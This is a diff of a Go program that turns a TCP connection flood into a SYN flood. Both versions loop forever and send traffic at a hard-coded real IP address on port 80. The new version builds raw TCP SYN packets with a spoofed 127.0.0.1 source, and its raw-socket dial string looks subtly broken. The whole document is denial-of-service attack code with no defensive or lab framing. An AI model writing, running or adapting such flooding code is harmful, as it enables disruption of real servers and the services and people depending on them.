@@ -1,30 +1,60 @@
 package main
 
 import (
-	"fmt"
-	"net"
-	"os"
+  "fmt"
+  "github.com/google/gopacket"
+  "github.com/google/gopacket/layers"
+  "net"
+  "strconv"
 )
 
 func main() {
-	message := make([]byte, 1024) // 1 KB message
-	for i := range message {
-		message[i] = 'A'
-	}
+    // Define your destination IP and port here
+  dstIP := net.ParseIP("193.228.196.49") // Change this to the IP you want to send to
+    dstPort := 80 // Change this to the port you want to send to
 
-	for {
-		go func() {
-			// Connect to the server
-			conn, err := net.Dial("tcp", "193.228.196.49:80")
-			if err != nil {
-				fmt.Println(err)
-				os.Exit(1)
-			}
-			defer conn.Close()
+  for {
+    // Create IP layer
+    ip := &layers.IPv4{
+      SrcIP:    net.IP{127, 0, 0, 1},
+      DstIP:    dstIP,
+      Version:  4,
+      TTL:      64,
+      Protocol: layers.IPProtocolTCP,
+    }
 
-			for {
-				conn.Write(message)
-			}
-		}()
-	}
+    // Create TCP layer
+    tcp := &layers.TCP{
+      SrcPort: layers.TCPPort(54321),
+      DstPort: layers.TCPPort(dstPort),
+      SYN:     true,
+    }
+
+    tcp.SetNetworkLayerForChecksum(ip)
+
+    buf := gopacket.NewSerializeBuffer()
+    opts := gopacket.SerializeOptions{
+      FixLengths:       true,
+      ComputeChecksums: true,
+    }
+
+    err := gopacket.SerializeLayers(buf, opts, ip, tcp)
+    if err != nil {
+      panic(err)
+    }
+
+        // Open a raw socket
+        conn, err := net.Dial("ip4:tcp", dstIP.String() + ":" + strconv.Itoa(dstPort))
+        if err != nil {
+            panic(err)
+        }
+
+        // Write the packet data to the socket
+        _, err = conn.Write(buf.Bytes())
+        if err != nil {
+            panic(err)
+        }
+
+        fmt.Printf("Packet sent: %x\n", buf.Bytes())
+    }
 }
